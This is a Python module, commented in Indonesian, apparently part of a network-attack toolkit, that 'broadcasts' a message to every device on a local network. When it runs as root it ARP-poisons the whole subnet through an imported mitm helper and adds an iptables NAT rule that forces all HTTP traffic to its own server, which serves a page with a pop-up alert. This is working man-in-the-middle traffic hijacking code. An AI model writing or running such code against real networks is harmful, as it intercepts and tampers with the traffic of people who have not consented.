# -*- coding: utf-8 -*-
"""Broadcast pesan ke seluruh device sejaringan."""
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from ..core import netutil as nu
from ._base import MODULES, mod
from .mitm import _poison, _scapy


@mod(name="broadcast.wifi", category="broadcast", desc="Popup pesan ke semua device sejaringan",
     params={"target": {"default": None, "desc": "kalimat pesan"},
             "title": {"default": "PEMBERITAHUAN JARINGAN"},
             "port": {"default": 80}, "duration": {"default": 0}})
def broadcast(ctx):
    msg = ctx.p("target") or "Halo, jaringan ini dipantau."
    title = ctx.p("title")
    port = ctx.pi("port")
    root = bool(nu.have("tsu") or nu.have("sudo"))
    if port < 1024 and not root:
        ctx.out("  port <1024 butuh root -> 8080")
        port = 8080

    page = f"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>{title}</title><style>html,body{{margin:0;height:100%}}
body{{background:#0b0f14;color:#e6edf3;font-family:system-ui;display:grid;place-items:center;
text-align:center;padding:24px}}h1{{color:#58a6ff;font-size:20px;letter-spacing:1px}}
p{{font-size:17px;line-height:1.6;max-width:640px}}small{{color:#484f58}}</style>
<h1>{title}</h1><p>{msg}</p><small>{time.strftime('%H:%M:%S')} &middot; {nu.my_ip()}</small>
<script>setTimeout(()=>alert({msg!r}),400)</script>""".encode()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(page)

    srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    ctx.out(f"  server :{port} aktif")

    stop = None
    base = ".".join(nu.my_ip().split(".")[:3])
    if root and _scapy():
        ctx.out("  mode root: poison seluruh subnet + redirect 80")
        stop = threading.Event()
        threading.Thread(target=_poison, args=(base + ".1", base + ".255", stop), daemon=True).start()
        ctx.exec(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
    else:
        ctx.out(f"  non-root: buka http://{nu.my_ip()}:{port} di device lain")

    ctx.finding("broadcast pesan", "info", msg, f"http://{nu.my_ip()}:{port}")
    end = time.time() + ctx.pi("duration")
    try:
        while not ctx.stopped and (ctx.pi("duration") == 0 or time.time() < end):
            time.sleep(0.5)
    finally:
        srv.shutdown()
        if root and stop:
            ctx.exec(f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}", 20)
            stop.set()
    return "broadcast selesai"
